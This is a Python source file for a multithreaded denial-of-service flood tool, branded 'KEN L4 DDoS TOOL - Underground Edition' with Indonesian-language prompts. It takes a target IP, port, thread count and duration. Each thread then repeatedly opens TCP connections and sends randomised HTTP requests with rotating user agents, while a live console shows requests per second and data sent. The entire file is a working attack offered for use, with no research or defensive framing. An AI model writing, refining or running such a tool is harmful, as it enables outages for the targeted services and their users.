import socket
import threading
import random
import time
import signal
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.layout import Layout
from datetime import datetime

console = Console()
running = True

def load_user_agents():
    try:
        with open("useragent.txt", "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        console.print("[bold red]🚨 File useragent.txt nggak ketemu! Gas dulu generate pake useragentgenerator.py cuy! 💥[/]")
        sys.exit(1)

user_agents = load_user_agents()

def generate_payload(ip):
    method = random.choice(["GET", "POST", "HEAD", "PUT"])
    path = random.choice(["/", "/index", "/home", "/api/data", "/random" + str(random.randint(1,999))])
    ua = random.choice(user_agents)
    headers = f"{method} {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: Keep-Alive\r\n\r\n"
    return headers.encode()

rps_counter = 0
mbps_counter = 0
total_requests = 0
total_data_mb = 0
lock = threading.Lock()

def attack(ip, port, duration, progress):
    global rps_counter, mbps_counter, total_requests, total_data_mb, running
    end_time = time.time() + duration
    while time.time() < end_time and running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            payload = generate_payload(ip)
            s.send(payload)
            with lock:
                rps_counter += 1
                mbps_counter += len(payload) / (1024 * 1024)
                total_requests += 1
                total_data_mb += len(payload) / (1024 * 1024)
            s.close()
            progress.advance(task_id)
        except:
            pass

def create_layout(ip, port, threads, duration):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=5),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="stats", ratio=1),
        Layout(name="details", ratio=1)
    )
    return layout

def update_display(ip, port, threads, duration, start_time, progress):
    global rps_counter, mbps_counter, total_requests, total_data_mb
    layout = create_layout(ip, port, threads, duration)
    
    layout["header"].update(
        Panel(
            f"                              [bold magenta]⚡ KEN L4 DDoS TOOL - FULL POWER ⚡[/]\n                                  [green]By Ken - Underground Edition[/]",
            border_style="red",
            title="KENSPLOIT"
        )
    )
    
    stats_table = Table(title="🔥 Real-Time Attack Stats 🔥", border_style="cyan")
    stats_table.add_column("Metric", style="bold yellow")
    stats_table.add_column("Value", style="bold green")
    stats_table.add_row("RPS", f"{rps_counter}")
    stats_table.add_row("Mbps", f"{mbps_counter:.2f}")
    stats_table.add_row("Total Requests", f"{total_requests}")
    stats_table.add_row("Total Data Sent (MB)", f"{total_data_mb:.2f}")
    layout["stats"].update(stats_table)
    
    details_table = Table(title="💥 Attack Details 💥", border_style="magenta")
    details_table.add_column("Parameter", style="bold yellow")
    details_table.add_column("Value", style="bold green")
    details_table.add_row("Target IP", ip)
    details_table.add_row("Target Port", str(port))
    details_table.add_row("Threads", str(threads))
    details_table.add_row("Duration", f"{duration} seconds")
    details_table.add_row("Start Time", datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'))
    layout["details"].update(details_table)
    
    layout["footer"].update(progress)
    
    return layout

def stats(ip, port, threads, duration, progress):
    global rps_counter, mbps_counter, running
    start_time = time.time()
    with Live(update_display(ip, port, threads, duration, start_time, progress), refresh_per_second=4, console=console):
        while running:
            time.sleep(1)
            with lock:
                rps_counter = 0
                mbps_counter = 0

def handle_exit(sig, frame):
    global running
    running = False
    console.print(Panel.fit("[bold red]🛑 SERANGAN DIHENTIKAN MANUAL ‼️[/]", border_style="bold yellow"))
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTSTP, handle_exit)

def main():
    console.clear()
    console.print(Panel.fit("  ⚡ [bold magenta]KEN L4 DDoS TOOL - POWERFULL[/] ⚡  \n     [green]By Ken - Underground Edition[/]\n", border_style="red"))

    ip = console.input("[bold yellow]🌐 Target IP: [/]")
    port = int(console.input("[bold yellow]📡 Port: [/]"))
    threads = int(console.input("[bold yellow]⚙️ Jumlah Thread: [/]"))
    duration = int(console.input("[bold yellow]⏱️ Durasi (detik): [/]"))

    progress = Progress(
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn(),
        console=console
    )
    task_id = progress.add_task("[cyan]🔥 Blasting Threads...", total=threads)

    console.print(f"\n[bold green]🚀 GASKEUN KE {ip}:{port} Pake {threads} Thread Selama {duration} Detik!![/]\n")

    threading.Thread(target=stats, args=(ip, port, threads, duration, progress), daemon=True).start()

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, duration, progress))
        thread.daemon = True
        thread.start()

    start = time.time()
    while running and (time.time() - start) < duration:
        time.sleep(1)

    console.print(Panel.fit("[bold red]🔥 SERANGAN SELESAI ‼️🔥[/]", border_style="bold green"))

if __name__ == "__main__":
    main()
